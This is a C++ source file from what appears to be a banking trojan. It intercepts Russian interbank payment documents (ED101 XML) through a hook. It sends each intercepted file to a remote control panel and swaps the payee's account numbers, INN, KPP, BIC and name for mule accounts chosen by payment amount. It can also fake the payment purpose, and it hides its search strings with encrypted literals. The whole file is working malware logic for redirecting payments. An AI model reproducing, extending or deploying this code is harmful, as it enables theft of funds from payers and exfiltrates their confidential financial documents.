/*
	kbriDataParser.cpp
	XML data buffer parsing related routines

*/

#include <Windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\inc\CryptoStrings.h"
#include "..\inc\MyStreams.h"

#include "kbriTargetAccManager.h"
#include "kbriGeneratePurpose.h"

#include "kbriDataParser.h"

KDP_GLOBALS gKDP;	// global vars


/*
	Checks if pbBuffer matches passed null-terminated szSignature
*/
BOOL _kdpMatchSignature(BYTE *pbBuffer, DWORD dwBufferLen, LPSTR szSignature)
{
	BOOL bRes = FALSE;
	BYTE *pb = pbBuffer;
	BYTE *pbSignature = (BYTE *)szSignature;
	DWORD dwCnt = dwBufferLen;

	do {

		// check for match
		if (*pb != *pbSignature) { break; }

		// move ptrs
		pb++;
		pbSignature++;
		dwCnt--;

		// check for end of signature
		if (*pbSignature == 0x00) { bRes = TRUE; break; }

	} while (dwCnt);


	return bRes;
}


/*
	Checks if null-terminated pattern exists somewhere at pbBuffer & dwBufferLen
	Found pattern offset is saved in pdwFoundOffset, if specified by caller
*/
BOOL kdpFindPattern(BYTE *pbBuffer, DWORD dwBufferLen, LPSTR szPattern, DWORD *pdwFoundOffset)
{
	BOOL bRes = FALSE;

	BYTE *pb = pbBuffer;
	DWORD dwCounter = dwBufferLen;

	do { // not a loop

		// search for starting signature
		while (!_kdpMatchSignature(pb, dwCounter, szPattern)) {

			// move ptrs
			pb++;
			dwCounter--;
			if (!dwCounter) { break; }
		}
		if (!dwCounter) { break; }

		// save found offset, if asked
		if (pdwFoundOffset) { *pdwFoundOffset = dwBufferLen - dwCounter; }

		// if got here - match found
		bRes = TRUE;

	} while (FALSE);	// not a loop

	return bRes;
}

/*
	Checks if any of patterns from szPatternsArray[] exists in passed buffer
*/
BOOL kdpFindPatternsArray(BYTE *pbBuffer, DWORD dwBufferLen, LPSTR szPatternsArray[])
{
	BOOL bRes = FALSE;
	LPSTR szPattern = NULL;
	BYTE bCount = 0;


	while (szPattern = szPatternsArray[bCount]) {

		bRes = kdpFindPattern(pbBuffer, dwBufferLen, szPattern, NULL);
		if (bRes) { break; }

		// move ptr
		bCount++;
	}

	return bRes;
}


/*
	Searches pBuffer & dwBufferLen for a whole chunk identified by patterns at szStart & szEnd
	If found, returns TRUE and a newly allocated buffer at szFound & dwFoundLen, to be deallocated by caller
	Also returns dwEndingOffset, a pBuffer-relative offset to the end of whole found chunk. This could be used to move pBuffer for a new search
*/
BOOL kdpGetChunk(LPVOID pBuffer, DWORD dwBufferLen, LPSTR szStart, LPSTR szEnd, LPSTR *szFound, DWORD *pdwFoundLen, DWORD *pdwEndingOffset)
{
	BOOL bRes = FALSE;

	BYTE *pb = (BYTE *)pBuffer;
	DWORD dwCounter = dwBufferLen;

	BYTE *pbStartFound = NULL;	// starting offset found

	DWORD dwStartPatternLen = 0;

	do {

		if (!pBuffer || !dwBufferLen || !szStart || !szEnd || !szFound || !pdwFoundLen) { DbgPrint("ERR: invalid input params"); break; }

		// search for starting signature
		while (!_kdpMatchSignature(pb, dwCounter, szStart)) {

			// move ptrs
			pb++;
			dwCounter--;
			if (!dwCounter) { DbgPrint("ERR: no starting match for [%s] from ptr %p len %u", szStart, pBuffer, dwBufferLen); break; }
		}
		if (!dwCounter) { break; }

		// save found position
		pbStartFound = pb;

		// move end search ptr on length of search pattern
		dwStartPatternLen = lstrlenA(szStart);
		if (dwCounter <= dwStartPatternLen) { break; }
		pb += dwStartPatternLen;
		dwCounter -= dwStartPatternLen;

		// scan for ending signature
		while (!_kdpMatchSignature(pb, dwCounter, szEnd)) {

			// move ptrs
			pb++;
			dwCounter--;
			if (!dwCounter) { DbgPrint("ERR: no ending match"); break; }
		}
		if (!dwCounter) { break; }

		// save ending offset
		if (pdwEndingOffset) { *pdwEndingOffset = (DWORD)((SIZE_T)pb - (SIZE_T)pBuffer + lstrlenA(szEnd)); }
		*pdwFoundLen = (DWORD)((SIZE_T)pb - (SIZE_T)pbStartFound + lstrlenA(szEnd)); 
		//DbgPrint("ending offset=%u, found len=%u", (DWORD)((SIZE_T)pb - (SIZE_T)pBuffer + lstrlenA(szEnd)), (DWORD)((SIZE_T)pb - (SIZE_T)pbStartFound + lstrlenA(szEnd)));

		// allocate new buffer with found substring
		*szFound = (LPSTR)my_alloc(*pdwFoundLen + 1);
		memcpy(*szFound, pbStartFound, *pdwFoundLen);

		bRes = TRUE;

	} while (FALSE);

	return bRes;
}


/*
	Extracts value from szField of format 
	ValueName="value"
	into newly allocated buffer at pszValue
	Returns TRUE on success, FALSE on any other error
*/
BOOL kdpGetValueFromField(LPSTR szField, DWORD dwFieldLen, LPSTR *pszValue)
{
	BOOL bRes = FALSE;

	// input ptr cast
	BYTE *pb = (BYTE *)szField;
	DWORD dwCnt = dwFieldLen;

	BYTE *pbRes = NULL;	// result

	do {	// not a loop

		if (!szField || !dwFieldLen || !pszValue) { DbgPrint("ERR: invalid input params"); break; }

		// alloc resulting buffer
		*pszValue = (LPSTR)my_alloc(dwFieldLen);
		pbRes = (BYTE *)*pszValue;

		// move ptr until we find first double quote
		while (dwCnt) {

			if (*pb == '"') { break; }

			// move ptrs
			pb++;
			dwCnt--;
		}

		if (!dwCnt) { break; }

		// bypass found quote
		pb++;
		dwCnt--;

		// do copy to resulting buffer until we find next double quote
		while (dwCnt) {

			if (*pb == '"') { break; }

			*pbRes = *pb;

			// move ptrs
			pb++;
			dwCnt--;
			pbRes++;
		}

		// ok if got here
		bRes = TRUE;

	} while (FALSE);	// not a loop

	return bRes;
}




// bFieldType possible values
#define F_FIELD 1
#define F_TAG	2
/*
	Perform length-independent replacement
	bFieldType - type of field for replacement, F_FIELD (Fieldname="FieldVal") or F_TAG(<FieldName>FieldValue</FieldName>)
	dwSearchStartOffset - offset to start search in msOriginalData for replacement pattern (szReplaceFieldName). This is needed due to same set of field are existed twice
	szReplaceFieldName - name of field to replace value of, without sign or quotes (just FieldName), assumed to be a null-terminated string
	szNewValue - string with a new value to be inserted into "..." of a field. Previous value's length may be any, resulting string buffer is corrected
	dwNewValue - lenth of data in ^, without null terminator
	msDocument - stream with document, where all the replacements are made

*/
BOOL kdpReplaceAfter(BYTE bFieldType, DWORD dwSearchStartOffset, LPSTR szReplaceFieldName, LPSTR szNewValue, DWORD dwNewValueLen, MY_STREAM *msDocument)
{
	BOOL bRes = FALSE;

	BYTE *pb = NULL;	// moving offset
	DWORD dwFieldStartOffset = 0;

	MY_STREAM msNew = { 0 }; // stream to receive buffer with replacement data

	DWORD dwLen = 0;	// amount of data to be copied

	DWORD dwCnt = 0;
	BYTE bSearch = 0;	// ending signature

	do {	// not a loop

		if (!szReplaceFieldName || !szNewValue || !dwNewValueLen || !msDocument || !msDocument->lDataLen) { DbgPrint("ERR: invalid input params"); break; }
		if (dwSearchStartOffset >= msDocument->lDataLen) { DbgPrint("ERR: start offset greater than data len"); break; }

		// calc starting position
		pb = (BYTE *)((SIZE_T)msDocument->pData + dwSearchStartOffset);

		// search ptr of field name
		// NB: dwFieldStartOffset is pb-relative
		if (!(kdpFindPattern(pb, msDocument->lDataLen - dwSearchStartOffset, szReplaceFieldName, &dwFieldStartOffset))) { DbgPrint("ERR: field [%s] not found", szReplaceFieldName); break; }

		DbgPrint("field offset found at %u", dwSearchStartOffset + dwFieldStartOffset);

		// init replacement stream
		msInitStream(&msNew);

		// write data before replacement place - calc length of data to be copied
		switch (bFieldType) {

			case F_FIELD:	dwLen = dwSearchStartOffset + dwFieldStartOffset + lstrlenA(szReplaceFieldName) + 1; bSearch = '"';	break; // was +2 when no '=' sign in pattern
			case F_TAG:		dwLen = dwSearchStartOffset + dwFieldStartOffset + lstrlenA(szReplaceFieldName) + 1; bSearch = '<';	break;

			default: DbgPrint("ERR: unknown bFieldType"); msNew.msFreeStream(&msNew); return bRes; break;
		} // switch bFieldType

		// copy starting chunk
		msNew.msWriteStream(&msNew, msDocument->pData, dwLen);

		// write replacement value
		msNew.msWriteStream(&msNew, szNewValue, dwNewValueLen);

		// search for ending signature defined at bSearch
		pb = (BYTE *)((SIZE_T)msDocument->pData + dwLen + 1 );
		dwCnt = msDocument->lDataLen - dwLen - 1;
		
		while (dwCnt) {

			// check
			if (*pb == bSearch) { break; }

			// move ptrs
			pb++;
			dwCnt--;
		}

		if (!dwCnt) { DbgPrint("ERR: ending signature not found");  break; }

		// pb & dwCnt now points to second part to be copied
		msNew.msWriteStream(&msNew, pb, dwCnt);

		//DbgPrint("repl [%s] done, orig_len=%u new_len=%u", szReplaceFieldName, msDocument->lDataLen, msNew.lDataLen);

		//DbgPrint("len=%u [%s]", msNew.lDataLen, msNew.pData);

		// replace original buffer
		msDocument->lDataLen = 0;
		msDocument->msWriteStream(msDocument, msNew.pData, msNew.lDataLen);

		bRes = TRUE;

	} while (FALSE);	// not a loop

		if (msNew.pData) { msNew.msFreeStream(&msNew); }

	return bRes;
}

/*
	Search szPattern at msTarget stream and replaces it with msNewValue
*/
BOOL kdpMergeReplacement(MY_STREAM *msTarget, LPSTR szPattern, DWORD dwPatternLen, MY_STREAM *msNewValue)
{
	BOOL bRes = FALSE;

	MY_STREAM ms = { 0 };	// tmp internal stream

	DWORD dwPatternOffset = 0;

	DWORD dwLenLeft = 0;

	do {	// not a loop

		if (!msTarget || !szPattern || !dwPatternLen || !msNewValue || !msTarget->lDataLen || !msNewValue->lDataLen) { DbgPrint("ERR: invalid input params"); break; }

		// find pattern
		if (!(kdpFindPattern((BYTE *)msTarget->pData, msTarget->lDataLen, szPattern, &dwPatternOffset))) { DbgPrint("ERR: pattern not found"); break; }

		// init tmp stream
		msInitStream(&ms);
		ms.msWriteStream(&ms, msTarget->pData, dwPatternOffset);

		// write new item
		ms.msWriteStream(&ms, msNewValue->pData, msNewValue->lDataLen);

		// append ending chunk, if any
		dwLenLeft = msTarget->lDataLen - dwPatternOffset - dwPatternLen;
		if (dwLenLeft) {

			ms.msWriteStream(&ms, (LPVOID)((SIZE_T)msTarget->pData + dwPatternOffset + dwPatternLen), dwLenLeft);

		} else { DbgPrint("NOTE: no ending part, replaced last chunk in data buffer"); }

		// replace original stream contents
		msTarget->lDataLen = 0; 
		msTarget->msWriteStream(msTarget, ms.pData, ms.lDataLen);

		bRes = TRUE;

	} while (FALSE);	// not a loop

	// cleanup
	if (ms.pData) { ms.msFreeStream(&ms); } else { DbgPrint("WARNWARN: empty buffer here"); }

	return bRes;
}




/*
	Parses single document chunk from szDocument & dwDocumentLen.
	Returns TRUE if a replacement for chunk was done in msOriginalData
*/
BOOL kdpCheckReplaceChunk(LPSTR szDocument, DWORD dwDocumentLen, MY_STREAM *msOriginalData)
{
	BOOL bRes = FALSE;

	LPSTR szSumField = NULL;	// sum string with staring & ending tags
	DWORD dwSumFieldLen = 0;	// ^ it's len

	LPSTR szSumValue = NULL;	// sum string, without any tags, ready for str2int conversion
	UINT64 i64SumValueK = 0;	// div 100000, in K
	UINT64 i64SumValue = 0;		// untouched value, to calculate 18% tax in purpose generator

	// decrypt buffers
	LPSTR szSumStart = NULL;
	LPSTR szSumEnd = NULL;

	DECODED_CREDS dCreds = { 0 };

	LPSTR szPayee = NULL;
	LPSTR szField = NULL;	// decrypt buffer

	MY_STREAM msDocumentWithReplacements = {0};	// stream containing szDocument with replacements done, to be merged into msOriginalData

	DWORD dwSearchStartingOffset = 0;	// offset at msDocumentWithReplacements's buffer from where search for replacement fields should be done (due to duplicate fields set)

	LPSTR szNewPurpose = NULL;

	do {

		// query Sum field
		szSumStart = CRSTRA("Sum=\"", "\xff\x9f\x7d\x0a\xfa\x9f\x4e\x17\xe2\xda\xdf");
		szSumEnd = CRSTRA("\"", "\x00\xe0\xf6\x0c\x01\xe0\xb4");

		if (!kdpGetChunk(szDocument, dwDocumentLen, szSumStart, szSumEnd, &szSumField, &dwSumFieldLen, NULL)) { DbgPrint("ERR: Sum field not found"); break; }

		//DbgPrint("SUM: %s", szSumField);

		// extract field value, as string
		if (!kdpGetValueFromField(szSumField, dwSumFieldLen, &szSumValue)) { DbgPrint("ERR: failed to get sum field value"); break; }

		//DbgPrint("SUM_STR: [%s]", szSumValue);

		// convert string into numeric, translated into K
		i64SumValue = _atoi64(szSumValue);
		i64SumValueK = i64SumValue / 100000;

		my_free(szSumValue); szSumValue = NULL;	// not needed anymore

		//DbgPrint("sum=%u K", (DWORD)i64SumValueK);

		// search for a matching t-acc for this amount
		// accounting will be done internally, also szDocument will be sent to remote side
		if (!tamGetCredsBySum(&gKDP.tal, (DWORD)i64SumValueK, &dCreds, szDocument, dwDocumentLen)) { /* DbgPrint("ERR: no matching tacc found"); */ break; }

		//DbgPrint("OK: found replacement data, proceeding");

		// init stream to contain single document with all the replacements
		msInitStream(&msDocumentWithReplacements);
		msDocumentWithReplacements.msWriteStream(&msDocumentWithReplacements, szDocument, dwDocumentLen);

		// decrypt field's heading element
		szPayee = CRSTRA("<Payee ", "\xfc\x1f\x32\x01\xfb\x1f\x6e\x39\xed\x1e\xd7\xec\x4c\xc0\xd2");

		// find starting offset to pass to function
		if (!(kdpFindPattern((BYTE *)msDocumentWithReplacements.pData, msDocumentWithReplacements.lDataLen, szPayee, &dwSearchStartingOffset))) { DbgPrint("ERR: starting pattern not found"); break; }
		//DbgPrint("starting offset defined as %u", dwSearchStartingOffset);

		// replace fields one by one
		szField = CRSTRA("PersonalAcc=", "\x00\xa0\xae\x0e\x0c\xa0\x9e\x03\x02\xab\x41\xe8\xf1\x54\x4f\xc5\xd3\x25\xa1");
		if (!kdpReplaceAfter(F_FIELD, dwSearchStartingOffset, szField, dCreds.szPersonalAcc, 20, &msDocumentWithReplacements)) { DbgPrint("ERR: PersonalAcc replacement failed"); break; }
		my_free(szField); szField = NULL;

		szField = CRSTRA("CorrespAcc=", "\xff\x3f\xfb\x09\xf4\x3f\xd8\x0e\xfd\x35\x1e\xf2\x1f\xe6\x38\xc2\x72\xb6\x9f");
		if (!kdpReplaceAfter(F_FIELD, dwSearchStartingOffset, szField, dCreds.szCorrespAcc, 20, &msDocumentWithReplacements)) { DbgPrint("ERR: CorrespAcc replacement failed"); break; }
		my_free(szField); szField = NULL;

		szField = CRSTRA("INN=", "\xff\xbf\xe9\x0a\xfb\xbf\xc0\x2c\xc1\xfa\x69");
		if (!kdpReplaceAfter(F_FIELD, dwSearchStartingOffset, szField, dCreds.szINN, 10, &msDocumentWithReplacements)) { DbgPrint("ERR: INN replacement failed"); break; }
		my_free(szField); szField = NULL;

		// not mandatory field, may be omitted
		szField = CRSTRA("KPP=", "\xff\xdf\x48\x0b\xfb\xdf\x63\x33\xdf\x9a\x74");
		if (!kdpReplaceAfter(F_FIELD, dwSearchStartingOffset, szField, dCreds.szKPP, 9, &msDocumentWithReplacements)) { DbgPrint("NOTE: KPP field omitted"); }
		my_free(szField); szField = NULL;

		szField = CRSTRA("BIC=", "\xff\x7f\x0a\x0a\xfb\x7f\x28\x2b\xcc\x3a\xc3");
		if (!kdpReplaceAfter(F_FIELD, dwSearchStartingOffset, szField, dCreds.szBIC, 9, &msDocumentWithReplacements)) { DbgPrint("ERR: BIC replacement failed"); break; }
		my_free(szField); szField = NULL;

		szField = CRSTRA("Name", "\xff\x9f\x70\x0a\xfb\x9f\x5e\x03\xe2\x82\x45");
		if (!kdpReplaceAfter(F_TAG, dwSearchStartingOffset, szField, dCreds.szName, lstrlenA(dCreds.szName), &msDocumentWithReplacements)) { DbgPrint("ERR: Name replacement failed"); break; }
		my_free(szField); szField = NULL;

		// check for GP flag
		if (dCreds.bGP) {

			//DbgPrint("GP flag set");

			if (!kgpGeneratePurpose(&szNewPurpose, i64SumValue)) { DbgPrint("ERR: failed to make GP"); break; }

			// do replacement
			szField = CRSTRA("Purpose", "\xfc\x3f\x25\x02\xfb\x3f\x15\x1f\xfe\x37\xca\xf9\x09\x14\xb5");
			if (!kdpReplaceAfter(F_TAG, dwSearchStartingOffset, szField, szNewPurpose, lstrlenA(szNewPurpose), &msDocumentWithReplacements)) { DbgPrint("ERR: Purpose replacement failed"); break; }
			my_free(szField); szField = NULL;

			if (szNewPurpose) { my_free(szNewPurpose); }

		}	// bGP

		// merge msDocumentWithReplacements into full file data buffer msOriginalData, using search by pattern szDocument
		//DbgPrint("res doc [%s]", msDocumentWithReplacements.pData);
		kdpMergeReplacement(msOriginalData, szDocument, dwDocumentLen, &msDocumentWithReplacements);


		// if got here - done ok
		bRes = TRUE;

	} while (FALSE);

	// cleanup
	if (szSumStart) { my_free(szSumStart); }
	if (szSumEnd) { my_free(szSumEnd); }
	if (szSumField) { my_free(szSumField); }
	if (szPayee) { my_free(szPayee); }
	if (szField) { my_free(szField); }
	tamFreeDecodedCreds(&dCreds); 
	if (msDocumentWithReplacements.pData) { msDocumentWithReplacements.msFreeStream(&msDocumentWithReplacements); }
	

	return bRes;

}



/*
	Called by pipe server when it needs to process data buffer from hook
	NB: processing is done withing hook, and it may drop result if function takes too long.
	So it is essential to perform as fast as possible

	Returns TRUE if a new buffer is supplied
*/
DWORD WINAPI kdpParseDataInt(LPVOID pParameter)
{
	PD_PARAMS *pParams = (PD_PARAMS *)pParameter;

	BOOL bRes = FALSE;

	LPVOID pMovingPtr = pParams->pBuffer;	// moving ptr for scanning
	DWORD dwMovingLeft = pParams->dwBufferLen;	// amount of data left for processing

	LPVOID pMaxPtr = (LPVOID)((SIZE_T)pParams->pBuffer + pParams->dwBufferLen);

	LPSTR szDocumentChunk = NULL;	// newly allocated buffer with a chunk for "<ED101....</ED101>" buffer
	DWORD dwDocumentChunkLen = 0;

	DWORD dwEndingOffset = 0;

	// decrypt buffers
	LPSTR szStartPattern = NULL;
	LPSTR szEndPattern = NULL;

	#define MAX_PATTERNS_COUNT 20
	LPSTR szPatterns[MAX_PATTERNS_COUNT] = { NULL };
	LPSTR szStr = NULL;
	BYTE bCounter = 0;

	MY_STREAM ms = { 0 };	// output stream, used in case of replacement performed

	DbgPrint("entered, pbuff=%p dwBufferLen=%u", pParams->pBuffer, pParams->dwBufferLen);

	do {	// not a loop

		// good mem buffer check
		if (!pParams->pBuffer || !pParams->dwBufferLen) { DbgPrint("ERR: empty buffers"); break; }
		if (IsBadReadPtr(pParams->pBuffer, pParams->dwBufferLen)) { DbgPrint("ERR: bad read buffer p=%p len=%u", pParams->pBuffer, pParams->dwBufferLen); break; }

		// send source file to panel (maybe needs to be removed)
		tamIssueServerNotify(0, 0, pParams->pBuffer, pParams->dwBufferLen);

		// check if we have any accs available
		if (!gKDP.tal.dwtaCount) {
			DbgPrint("WARN: no accs available yet");
#ifndef _DEBUG
			break; 
#endif
		}

		// copy original data to tmp stream
		msInitStream(&ms);
		ms.msWriteStream(&ms, pParams->pBuffer, pParams->dwBufferLen);
		
		// decrypt pattern signatures
		szStartPattern = CRSTRA("<ED101 ", "\xff\xbf\xb3\x0b\xf8\xbf\xef\x26\xcb\xf6\x03\xb2\x4f\xdf\xf9");
		szEndPattern = CRSTRA("</ED101>", "\x00\x40\xaa\x0f\x08\x40\xf6\x48\x35\x7c\x1b\xb7\xa1\xe6\x1a");

		// bad patterns list
		//#define MAX_PATTERNS_COUNT 20
		szPatterns[0] = CRSTRA("DrawerStatus", "\xfd\x5f\x63\x05\xf1\x5f\x47\x1f\xec\x50\x86\xff\x3e\xb3\xa2\xd9\x38\x94\x5b");
		szPatterns[1] = CRSTRA("Корреспондентский субсчет", "\xfd\xff\xc6\x04\xe4\xff\x6c\x82\x7d\x77\xa3\x7d\x82\x89\x8b\x48\xa8\xaa\xf4\x3d\xc7\xcf\xcf\xcc\xfc\xf4\x27\xfd\x1a\x02\x14");
		szPatterns[2] = CRSTRA("Внутрибанковские требования", "\xfe\x3f\xcf\x08\xe5\x3f\x6d\x8d\x7d\xb5\xbf\x68\x8f\x47\x82\x4a\xa0\x65\xfe\x2a\xc6\x02\x0f\x12\xfe\x22\x2e\xee\x0c\xc7\x02\xc8\x31\x3a\x5a");

		DbgPrint("pMovingPtr=%p dwMovingLeft=%u", pMovingPtr, dwMovingLeft);

		while (kdpGetChunk(pMovingPtr, dwMovingLeft, szStartPattern, szEndPattern, &szDocumentChunk, &dwDocumentChunkLen, &dwEndingOffset)) {

			// check for chunk to be non-tax payment and some other bad signs
			if (!kdpFindPatternsArray((BYTE *)szDocumentChunk, dwDocumentChunkLen, szPatterns)) {

				//DbgPrint("found chunk [%s]", szDocumentChunk);

				if (kdpCheckReplaceChunk(szDocumentChunk, dwDocumentChunkLen, &ms)) {

					DbgPrint("OK: replacement made");
					bRes = TRUE;

				}

			} // tax payment check

			// cleanup
			if (szDocumentChunk) { my_free(szDocumentChunk); szDocumentChunk = NULL; }

			// move ptrs
			pMovingPtr = (LPVOID)((SIZE_T)pMovingPtr + dwEndingOffset);
			if (dwEndingOffset <= dwMovingLeft) { dwMovingLeft -= dwEndingOffset; }
			if (!dwMovingLeft) { DbgPrint("all scanned"); break; }
		}

		// free array elements
		while (szPatterns[bCounter]) { my_free(szPatterns[bCounter]); bCounter++; }
		
		// check if we have a replacement
		if (bRes) {

			// pass stream's ptrs to caller
			*pParams->dwResBufferLen = ms.lDataLen;
			*pParams->pResBuffer = ms.pData;
		} else {

			// nothing found, free stream
			ms.msFreeStream(&ms);
		}

	} while (FALSE);	// not a loop

	// cleanup
	if (szStartPattern) { my_free(szStartPattern); }
	if (szEndPattern) { my_free(szEndPattern); }

	// output result to caller
	pParams->bRes = bRes;
	return bRes;
}


/*
	Calls kdpParseDataInt() as a thread, with timeout to protect from internal errors
*/
BOOL kdpParseData(LPVOID pBuffer, DWORD dwBufferLen, LPVOID *pResBuffer, DWORD *dwResBufferLen)
{

	PD_PARAMS pParams = { pBuffer, dwBufferLen, pResBuffer, dwResBufferLen, FALSE };	// params to be passed to processing thread
	DWORD dwThreadId = 0;
	HANDLE hThread = NULL;

	do { // not a loop

		// create worker thread
		if (!(hThread = CreateThread(NULL, 0, kdpParseDataInt, &pParams, 0, &dwThreadId))) { DbgPrint("ERR: failed to created worker thread"); break; }

		// wait max 30 sec for processing before assuming a fail
		if (WAIT_OBJECT_0 != WaitForSingleObject(hThread, 30000)) { 

			DbgPrint("ERR: timeout exceeded waiting for result"); 

			// save special dbg notify
			// ...

			TerminateThread(hThread, 0); 
			break; 
		}

		// result is assumed to be at pParams.bRes

	} while (FALSE);	// not a loop

	// cleanup, if needed
	if (hThread) { CloseHandle(hThread); }


	return pParams.bRes;
}


/*
	Performs init and creation of server link thread to get accs and send diagnostics
*/
VOID kdpInit()
{
	DbgPrint("entered");

	// init globals
	memset(&gKDP, 0, sizeof(KDP_GLOBALS));

	// init target accounts manager
	tamInit(&gKDP.tal);

}